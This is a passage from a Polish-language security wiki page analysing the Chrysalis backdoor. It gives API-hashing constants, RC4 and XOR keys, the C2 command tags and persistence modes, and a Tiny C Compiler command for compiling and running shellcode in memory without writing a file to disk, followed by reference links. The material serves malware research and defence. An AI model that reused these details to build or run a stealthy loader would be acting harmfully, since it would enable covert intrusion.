- Aby uniknąć IAT, loader rozwiązuje API przez haszowanie nazw eksportów używając **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, następnie stosuje Murmur-style avalanche (**0x85EBCA6B**) i porównuje z solonymi docelowymi hashami.

Main shellcode (Chrysalis)
- Dekoduje moduł główny przypominający PE powtarzając add/XOR/sub z kluczem `gQ2JR&9;` przez pięć przebiegów, następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odbudowuje ciągi nazw DLL w czasie wykonania poprzez per-znakowe obracanie bitów/XOR, po czym ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przegląda **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę eksportów w blokach po 4 bajty z mieszaniną w stylu Murmur i odwołuje się do `GetProcAddress` tylko jeśli hash nie zostanie znaleziony.

Embedded configuration & C2
- Konfiguracja znajduje się wewnątrz upuszczonego pliku `BluetoothService` na **offset 0x30808** (rozmiar **0x980**) i jest RC4-decryptowana kluczem `qwhvb^435h&*7`, ujawniając URL C2 i User-Agent.
- Beacony budują profil hosta rozdzielony kropkami, dopisują prefiks `4Q`, po czym RC4-encryptują z kluczem `vAuig34%^325hGV` przed `HttpSendRequestA` przez HTTPS. Odpowiedzi są RC4-decrypted i dystrybuowane przez switch tagów (`4T` shell, `4V` uruchomienie procesu, `4W/4X` zapis pliku, `4Y` odczyt/wyciek, `4\\` odinstalowanie, `4` enumeracja dysków/plików + przypadki chunked transfer).
- Tryb wykonania jest sterowany argumentami CLI: brak argumentów = instalacja persistence (service/Run key) wskazująca na `-i`; `-i` ponownie uruchamia się z `-k`; `-k` pomija instalację i uruchamia payload.

Alternate loader observed
- To samo włamanie upuściło Tiny C Compiler i uruchomiło `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczony przez atakującego kod źródłowy C zawierał embedded shellcode, został skompilowany i uruchomiony in-memory bez zapisywania PE na dysku. Powtórz to za pomocą:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ta faza TCC-based compile-and-run zaimportowała w czasie wykonywania `Wininet.dll` i pobrała second-stage shellcode z hardcoded URL, tworząc elastyczny loader, który podszywa się pod compiler run.

## Referencje

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
